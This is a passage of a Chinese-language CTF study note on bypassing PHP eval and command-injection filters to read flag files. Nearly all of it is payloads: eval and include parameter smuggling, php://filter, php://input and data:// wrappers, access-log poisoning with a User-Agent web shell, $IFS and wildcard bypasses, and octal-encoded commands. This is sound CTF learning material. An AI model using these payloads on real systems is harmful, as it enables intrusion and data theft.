<p>在很多操作系统的文件系统中，<code>?</code>​ 被用作通配符，代表 <strong>任何单个字符</strong>。在 Linux 中，<code>f???????</code>​ 可以匹配任何以 <code>f</code>​ 开头并包含 7 个任意字符的文件名</p>
<h2 id="3-5-传参执行绕过"><a href="#3-5-传参执行绕过" class="headerlink" title="3.5 传参执行绕过"></a>3.5 传参执行绕过</h2><h3 id="3-5-1-eval函数"><a href="#3-5-1-eval函数" class="headerlink" title="3.5.1 eval函数"></a>3.5.1 eval函数</h3><p>eval函数执行任意php命令，这里利用get方式接受x参数，在传参中执行命令，而在这个get方式接受的参数并没有被过滤</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-include函数"><a href="#3-5-2-include函数" class="headerlink" title="3.5.2 include函数"></a>3.5.2 include函数</h3><p>这个方法实际上是结合了文件包含漏洞，利用文件包含读取flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>如果<code>(</code>​和<code>;</code>​被过滤：<br>​<code>%0a</code>​ 是 URL 编码中表示换行符（<code>\n</code>​）的字符。从而使得 <code>include</code>​ 语句和 <code>$_GET[1]</code>​ 的处理被分开，从而绕过过滤机制，不过include函数这里不加<code>(</code>​也是可以的<br>php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include%<span class="number">0</span>a$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="3-5-3-日志包含"><a href="#3-5-3-日志包含" class="headerlink" title="3.5.3 日志包含"></a>3.5.3 日志包含</h3><p>既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件，日志包含可以参考我过去的文章。这里的日志目录需要多次尝试。用蚁剑连接<code>http://576f2421-5308-45ef-9c2e-17454de9e09a.challenge.ctf.show/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</code>​即可，注意要用<code>http</code>​，浏览器上直接粘下来会由于SSL证书连不上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=../../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>  </span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-6-变量作用域劫持攻击"><a href="#3-6-变量作用域劫持攻击" class="headerlink" title="3.6 变量作用域劫持攻击"></a>3.6 变量作用域劫持攻击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">post:</span><br><span class="line">	<span class="number">1</span>=system(<span class="string">&#x27;tac fl*&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-6-1-函数解释"><a href="#3-6-1-函数解释" class="headerlink" title="3.6.1 函数解释"></a>3.6.1 函数解释</h3><ul>
<li>​<strong>​<code>get_defined_vars()</code>​</strong> ​<br>获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值。</li>
<li>​<strong>​<code>next(get_defined_vars())</code>​</strong> ​<br>将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 <code>get_defined_vars()</code>​ 返回的数组。</li>
<li>​<strong>​<code>array_pop(...)</code>​</strong> ​<br>弹出数组的最后一个元素。这里作用在 <code>next(get_defined_vars())</code>​ 的结果上，获取这个数组的最后一个变量值。</li>
</ul>
<h3 id="3-6-2-攻击流程"><a href="#3-6-2-攻击流程" class="headerlink" title="3.6.2 攻击流程"></a>3.6.2 攻击流程</h3><ul>
<li>攻击者通过 <code>POST</code>​ 请求传入 <code>1=system(&#39;tac fl*&#39;);</code>​，在服务器端该数据被<strong>存储为变量</strong>。</li>
<li>​<code>array_pop(next(get_defined_vars()))</code>​ 获取该变量值，即 <code>system(&#39;tac fl*&#39;)</code>​。</li>
<li>​<code>eval()</code>​ 动态执行，触发 <code>system(&#39;tac fl*&#39;)</code>​，攻击者能够获取敏感文件内容。</li>
</ul>
<h2 id="3-7-函数嵌套文件枚举"><a href="#3-7-函数嵌套文件枚举" class="headerlink" title="3.7 函数嵌套文件枚举"></a>3.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h2 id="3-8-函数嵌套文件读取"><a href="#3-8-函数嵌套文件读取" class="headerlink" title="3.8 函数嵌套文件读取"></a>3.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">?c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>还可以用另一个函数得到目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="四-空格过滤"><a href="#四-空格过滤" class="headerlink" title="四. 空格过滤"></a>四. 空格过滤</h1><h2 id="4-1-20​空格绕过"><a href="#4-1-20​空格绕过" class="headerlink" title="4.1 %20​空格绕过"></a>4.1 <code>%20</code>​空格绕过</h2><p>是 URL 编码的空格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%20flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-2-09​空格绕过"><a href="#4-2-09​空格绕过" class="headerlink" title="4.2 %09​空格绕过"></a>4.2 <code>%09</code>​空格绕过</h2><p>​<code>%09</code>​ 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 <code>tac</code>​ 后面的 <code>fla*</code>​ 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%09flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-3-IFS-9​空格绕过"><a href="#4-3-IFS-9​空格绕过" class="headerlink" title="4.3 $IFS$9​空格绕过"></a>4.3 <code>$IFS$9</code>​空格绕过</h2><p>​<code>$IFS</code>​ 是一个特殊的环境变量，表示 <strong>Internal Field Separator（内部字段分隔符）</strong> ，默认情况下，<code>$IFS</code>​ 的值包含空格、制表符和换行符。<code>$9</code>​是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$IFS$9flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-4-IFS-​绕过"><a href="#4-4-IFS-​绕过" class="headerlink" title="4.4 ${IFS}​绕过"></a>4.4 <code>$&#123;IFS&#125;</code>​绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$&#123;IFS&#125;flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-5"><a href="#4-5" class="headerlink" title="4.5 &lt;​空格绕过"></a>4.5 <code>&lt;</code>​空格绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac&lt;fla*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​<code>&lt;</code>​ 是 <strong>输入重定向符号</strong>，用于将文件内容作为命令的输入，可以用于空格绕过。</p>
<h1 id="五-命令过滤"><a href="#五-命令过滤" class="headerlink" title="五. 命令过滤"></a>五. 命令过滤</h1><h2 id="5-1-​空字符匹配绕过"><a href="#5-1-​空字符匹配绕过" class="headerlink" title="5.1 &#39;&#39;​空字符匹配绕过"></a>5.1 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta&#x27;&#x27;c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>和文件名绕过一样，<strong>空字符串</strong>的可以用于绕过某些函数的过滤，<code>ta&#39;&#39;c</code>​ 等价于 <code>tac</code>​</p>
<h2 id="5-2-​匹配绕过"><a href="#5-2-​匹配绕过" class="headerlink" title="5.2 \​匹配绕过"></a>5.2 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta\c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>ta\c</code>​ 可能会被解释为 <code>tac</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
<h2 id="5-3-命令文件-​绕过"><a href="#5-3-命令文件-​绕过" class="headerlink" title="5.3 命令文件+?​绕过"></a>5.3 命令文件+<code>?</code>​绕过</h2><p>cat命令所在的路径是在&#x2F;bin&#x2F;目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面，如果bin被过滤了也可以用通配符<br>记得cat要看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/c?t flag.php</span><br><span class="line">?c=/?in/c?t flag.php</span><br></pre></td></tr></table></figure>

<p>同理，base64命令也可以这样操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ba?e64 flag.php</span><br></pre></td></tr></table></figure>

<h2 id="5-4-换用其他命令"><a href="#5-4-换用其他命令" class="headerlink" title="5.4 换用其他命令"></a>5.4 换用其他命令</h2><p>在第一部分有这么多函数，说不定有些没被过滤呢</p>
<h1 id="六-字母过滤"><a href="#六-字母过滤" class="headerlink" title="六. 字母过滤"></a>六. 字母过滤</h1><h2 id="6-1-base64命令文件执行"><a href="#6-1-base64命令文件执行" class="headerlink" title="6.1 base64命令文件执行"></a>6.1 base64命令文件执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br><span class="line">?c=/???/????<span class="number">64</span> ????.???</span><br></pre></td></tr></table></figure>

<h2 id="6-2-数字ASCII码代替字母"><a href="#6-2-数字ASCII码代替字母" class="headerlink" title="6.2 数字ASCII码代替字母"></a>6.2 数字ASCII码代替字母</h2><p>​<code>$&#39;</code>​ 是 Bash 中的字符转义机制，用于解析以反斜杠 <code>\</code>​ 开头的转义字符或八进制&#x2F;十六进制字符表示。其中，以<code>\143</code>​为例，<code>\143</code>​ 是 ASCII 八进制表示，转换为字符 <strong>​<code>c</code>​</strong>​。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=$<span class="string">&#x27;\154\163&#x27;</span>      ls</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\143\141\164&#x27;</span>%<span class="number">20</span>*     cat *</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\164\141\143&#x27;</span> $<span class="string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span>      tac flag.php</span><br></pre></td></tr></table></figure>

<p>可以使用python脚本来实现八进制ASCII码的编码与解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_octal</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其ASCII码的八进制表示</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">input_string = <span class="string">&quot;cat&quot;</span></span><br><span class="line">encoded_string = encode_to_octal(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded: <span class="subst">&#123;encoded_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_octal</span>(<span class="params">octal_string</span>):</span><br><span class="line">    <span class="comment"># 分割八进制字符串，并将每个八进制值转换为字符</span></span><br><span class="line">    characters = octal_string.split(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">1</span>:]  <span class="comment"># 去掉空字符串部分</span></span><br><span class="line">    decoded_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(c), <span class="number">8</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> characters)</span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">octal_string = <span class="string">&quot;\\143\\141\\164&quot;</span></span><br><span class="line">decoded_string = decode_from_octal(octal_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded: <span class="subst">&#123;decoded_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="七-命令执行函数过滤"><a href="#七-命令执行函数过滤" class="headerlink" title="七. 命令执行函数过滤"></a>七. 命令执行函数过滤</h1><p>题目只有一层<code>eval</code>​，而用于执行命令的函数都被过滤了，下面将介绍如何<strong>仅仅通过函数的结合，不利用任何命令</strong>，来实现目录与文件读取</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;        </span><br><span class="line">	$c= $_POST[<span class="string">&#x27;c&#x27;</span>];           </span><br><span class="line">	eval($c);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	highlight_file(__FILE__);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-1-函数嵌套目录读取"><a href="#7-1-函数嵌套目录读取" class="headerlink" title="7.1 函数嵌套目录读取"></a>7.1 函数嵌套目录读取</h2><h3 id="7-1-1-自根目录向下读取目录"><a href="#7-1-1-自根目录向下读取目录" class="headerlink" title="7.1.1 自根目录向下读取目录"></a>7.1.1 自根目录向下读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www/html&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>这里也一样，不再列举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(<span class="string">&quot;/&quot;</span>)));</span><br><span class="line">c=echo json_encode(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="7-1-2-自当前目录向上读取目录"><a href="#7-1-2-自当前目录向上读取目录" class="headerlink" title="7.1.2 自当前目录向上读取目录"></a>7.1.2 自当前目录向上读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));  <span class="comment">// 读取当前目录</span></span><br><span class="line">c=print_r(scandir(dirname(__DIR__)));   <span class="comment">// 读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__FILE__))));<span class="comment">//读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__DIR__))));<span class="comment">//读取上上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>dirname()</code>​ 用于获取路径的目录部分。<code>dirname(&#39;FILE&#39;);</code>​返回 ‘.’</li>
<li>​<code>scandir()</code>​ 列出指定目录中的文件和目录，返回一个数组</li>
<li>​<code>print_r()</code>​ 输出变量的易读信息，适合用于调试和查看数组内容</li>
<li>​<code>__FILE__</code>​ <code>__DIR__</code>​是php中的魔术方法，可以用于获取当前目录与上级目录，通过迭代<code>dirname</code>​函数就能实现目录遍历<br>输出：<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</code>​<br>这里也一样，不再列举</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(dirname(dirname(dirname(dirname(__DIR__)))))));</span><br><span class="line">c=echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>

<p>还可以用glob函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../../*&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="7-2-include函数文件读取"><a href="#7-2-include函数文件读取" class="headerlink" title="7.2 include函数文件读取"></a>7.2 include函数文件读取</h2><h3 id="7-2-1-直接包含输出文件"><a href="#7-2-1-直接包含输出文件" class="headerlink" title="7.2.1 直接包含输出文件"></a>7.2.1 直接包含输出文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=include(<span class="string">&quot;flag.php&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;../../../../../flag.txt&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);echo $flag;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-2-伪协议文件读取❓"><a href="#7-2-2-伪协议文件读取❓" class="headerlink" title="7.2.2 伪协议文件读取❓"></a>7.2.2 伪协议文件读取❓</h3><ol>
<li>​<code>php://filter</code>​伪协议，它的传参伪协议打法更详细见[[#3.5.2 include函数]]</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=../../../../../flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>​<code>php://input</code>​伪协议</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=php:<span class="comment">//input</span></span><br><span class="line">post：&lt;?php system(<span class="string">&quot;ls -lah&quot;</span>)?&gt;</span><br><span class="line">      &lt;?php system(<span class="string">&quot;tac flag.php&quot;</span>)?&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>​<code>data://</code>​伪协议<br> 第二个是对php代码base64编码绕过<code>flag.php</code>​的过滤❓</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br><span class="line">c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain;base64,data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,&lt;?=system(&quot;ls&quot;)?&gt;      //短标签绕过php过滤</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-3-日志包含"><a href="#7-2-3-日志包含" class="headerlink" title="7.2.3 日志包含"></a>7.2.3 日志包含</h3><p>日志的相对位置需要去遍历目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include(../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>)</span><br><span class="line">UA:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-3-针对文件包含的过滤"><a href="#7-2-3-针对文件包含的过滤" class="headerlink" title="7.2.3 针对文件包含的过滤"></a>7.2.3 针对文件包含的过滤</h3><p>传参伪协议</p>
<h2 id="7-3-highlight函数文件读取"><a href="#7-3-highlight函数文件读取" class="headerlink" title="7.3 highlight函数文件读取"></a>7.3 highlight函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访问当前目录下的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">//通过相对路径访问上级目录的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"><span class="comment">//自根目录访问下级目录中的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="7-4-show-source函数文件读取"><a href="#7-4-show-source函数文件读取" class="headerlink" title="7.4 show_source函数文件读取"></a>7.4 show_source函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="7-5-readgzfile函数文件读取"><a href="#7-5-readgzfile函数文件读取" class="headerlink" title="7.5 readgzfile函数文件读取"></a>7.5 readgzfile函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=readgzfile(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="7-6-require-once函数文件读取"><a href="#7-6-require-once函数文件读取" class="headerlink" title="7.6 require_once函数文件读取"></a>7.6 require_once函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require_once(<span class="string">&#x27;/flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="7-7-函数嵌套文件枚举"><a href="#7-7-函数嵌套文件枚举" class="headerlink" title="7.7 函数嵌套文件枚举"></a>7.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h2 id="7-8-函数嵌套文件读取"><a href="#7-8-函数嵌套文件读取" class="headerlink" title="7.8 函数嵌套文件读取"></a>7.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
